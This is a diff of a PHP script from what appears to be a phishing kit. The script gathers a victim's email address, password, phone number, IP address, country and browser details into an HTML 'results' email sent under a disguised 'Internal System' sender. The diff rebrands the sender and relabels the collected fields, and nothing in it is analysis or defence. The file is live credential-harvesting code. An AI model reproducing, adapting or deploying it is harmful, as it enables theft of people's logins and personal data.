@@ -14,19 +14,21 @@ $web = $_SERVER["HTTP_HOST"];
 $inj = $_SERVER["REQUEST_URI"];
 $server = date("D/M/d, Y g:i a"); 
 $sender = 'result';
-$page = 'Connexion';
-$subj = "Alerte de $page";
-$headers .= "From: Nom de votre Systeme<$sender>\n";
+$page = 'Internal System';
+$subj = "Nouveau message :: $page";
+$headers .= "From: Internal System<$sender>\n";
 $headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
 $headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
 $over = '';
 $msg = "<HTML><BODY><TABLE>
- <tr><td>________<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>Resultats<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>_________</td></tr>
- <tr><td>Adresse email: $email | Mot de passe: $pass | Telephone: $pnum
- <br>Adresse IP: $country | <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> | <img src='http://www.translatorscafe.com/cafe/images/flags/$countryCode.gif' height='12' /> | $countryCode | $continentCode | $regionName | Date: $server </td></tr>
- <tr><td>________<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>Autres infos<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>__________</td></tr>
+ <tr><td>________<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>Informations<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>_________</td></tr>
+ <tr><td>Adresse Email: $email</td></tr>
+ <tr><td>Nom complet: $pass</td></tr>
+ <tr><td>Telephone: $pnum</td></tr>
+ <tr><td>________<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>D&eacute;tails<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>__________</td></tr>
+ <tr><td>Pays: $country | Adresse IP: <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> | <img src='http://www.translatorscafe.com/cafe/images/flags/$countryCode.gif' height='12' /> | $countryCode | $continentCode | $regionName | Date: $server </td></tr>
  <tr><td>User-Agent: '$browser' 
- <br />URL: http://$web$inj </td></tr>
+ <br />URL: https://$web$inj </td></tr>
  </BODY>
  </HTML>";
 if (empty($email) || empty($pass)) {
